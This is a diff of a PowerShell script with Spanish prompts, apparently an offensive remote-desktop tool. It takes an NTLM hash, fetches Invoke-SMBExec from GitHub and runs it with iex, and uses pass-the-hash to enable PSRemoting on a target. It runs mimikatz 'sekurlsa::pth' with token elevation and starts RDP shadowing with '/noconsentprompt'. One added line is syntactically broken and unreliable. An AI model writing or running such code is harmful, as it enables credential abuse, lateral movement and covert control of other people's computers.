@@ -103,6 +103,7 @@ function EnableTLS {
         $ntlmpass = Read-Host -Prompt 'Por último, el hash NTLM'
 	$PassTheHash = "true"
         Write-Host ""
+        Write-Output "computer=$computer" > file.txt
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose
@@ -151,9 +152,10 @@ function EnableTLS {
       } until ($input -in '1','2','3','4')
 
    $Host.UI.RawUI.ForegroundColor = 'Gray'
-   if(Test-Path variable:PassTheHash) { $powershell = '"$RDP = New-PSSession -Computer $computer -Authentication Kerberos"'
-   $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $powershell' exit"
-   powershell $mimipath\mimikatz.exe $cmd ; Write-Host ""}
+   if(Test-Path variable:PassTheHash) { = powershell "Get-Content file.txt | Out-String | ConvertFrom-StringData | Format-List | findstr 'Value'"
+   $RDP = "New-PSSession -Computer $computer"
+   $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $RDP' exit"
+   powershell $mimipath\mimikatz.exe $cmd ; Write-Host "" ; del file.txt }
    
    else { Write-Host ""
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
@@ -223,8 +225,7 @@ function EnableTLS {
         if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
         else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
-    else {
-        Write-Host ""
+    else { Write-Host ""
         Write-Host "$version detectado, aplicando parche.."
         invoke-command -session $RDP[0] -scriptblock {
         add-type @"
